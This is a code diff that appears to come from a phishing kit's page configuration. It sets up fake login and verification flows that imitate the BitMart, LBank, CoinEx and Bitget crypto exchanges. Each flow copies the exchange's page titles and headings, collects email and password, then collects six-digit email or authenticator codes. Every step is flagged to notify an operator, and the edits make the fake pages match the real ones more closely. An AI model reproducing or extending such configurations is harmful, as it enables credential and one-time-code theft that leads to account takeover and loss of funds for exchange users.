-  { slug:'2fa',      form_type:'otp',   page_title:'Security Verification',    headline:'Security Verification', subheadline:'Enter the security code we sent to your email or phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'Verify', notify_step:true, otp_length:6 }
+  { slug:'login',      form_type:'login', page_title:'Login | BitMart',           headline:'Log In',                             subheadline:'',                                                          fields:['email','password'], layout:'auth', cta:'Log In',    step_label:'Login',      notify_step:true  },
+  { slug:'email-otp',  form_type:'otp',   page_title:'Email Verification Code',   headline:'Email Verification Code',            subheadline:'Enter the 6-digit code sent to your email',                 fields:['code'],             layout:'otp',  cta:'Submit',    step_label:'Email OTP',  notify_step:true,  otp_length:6 }
 ];
 
 FLOWS.lbank = [
-  { slug:'login',    form_type:'login', page_title:'Log In – LBank',           headline:'Log in to LBank',      subheadline:'', fields:['email','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
-  { slug:'2fa',      form_type:'otp',   page_title:'Verification',             headline:'Security Verification', subheadline:'Enter the verification code sent to your email', fields:['code'], layout:'otp', cta:'Submit', step_label:'Verify', notify_step:true, otp_length:6 }
+  { slug:'login',      form_type:'login', page_title:'Login | LBank',             headline:'Log In',                             subheadline:'',                                                          fields:['email','password'], layout:'auth', cta:'Login',     step_label:'Login',      notify_step:true  },
+  { slug:'email-otp',  form_type:'otp',   page_title:'Email Verification',        headline:'Email Verification Code',            subheadline:'Enter the verification code sent to your email',             fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'Email OTP',  notify_step:true,  otp_length:6 }
 ];
 
 FLOWS.coinex = [
-  { slug:'login',    form_type:'login', page_title:'Log In – CoinEx',          headline:'Log in to CoinEx',     subheadline:'', fields:['email','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
-  { slug:'2fa',      form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Enter the code from your authenticator app or SMS', fields:['code'], layout:'otp', cta:'Verify', step_label:'2FA', notify_step:true, otp_length:6 }
+  { slug:'login',      form_type:'login', page_title:'Sign In | CoinEx',          headline:'Sign In',                            subheadline:'',                                                          fields:['email','password'], layout:'auth', cta:'Sign In',   step_label:'Login',      notify_step:true  },
+  { slug:'email-otp',  form_type:'otp',   page_title:'Email Verification',        headline:'Email Verification',                 subheadline:'Enter the 6-digit code sent to your email',                 fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'Email OTP',  notify_step:true,  otp_length:6 }
 ];
 
 FLOWS.bitget = [
-  { slug:'login',    form_type:'login', page_title:'Log In – Bitget',          headline:'Log in to Bitget',     subheadline:'', fields:['email','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
-  { slug:'2fa',      form_type:'otp',   page_title:'Verification',             headline:'Security Verification', subheadline:'Please enter the verification code sent to your email or phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'Verify', notify_step:true, otp_length:6 }
+  { slug:'login',      form_type:'login', page_title:'Login | Bitget',            headline:'Welcome back',                       subheadline:'',                                                          fields:['email','password'], layout:'auth', cta:'Log in',    step_label:'Login',       notify_step:true  },
+  { slug:'email-code', form_type:'otp',   page_title:'Email Verification',        headline:'Email Verification Code',            subheadline:'Enter the 6-digit code sent to your email address',         fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'Email Code',  notify_step:true,  otp_length:6 },
+  { slug:'2fa-totp',   form_type:'otp',   page_title:'Authenticator Verification',headline:'Authenticator Verification',         subheadline:'Enter the 6-digit code from your authenticator app',        fields:['code'],             layout:'otp',  cta:'Confirm',   step_label:'TOTP 2FA',    notify_step:true,  otp_length:6 }
 ];
 
 FLOWS.pionex = [
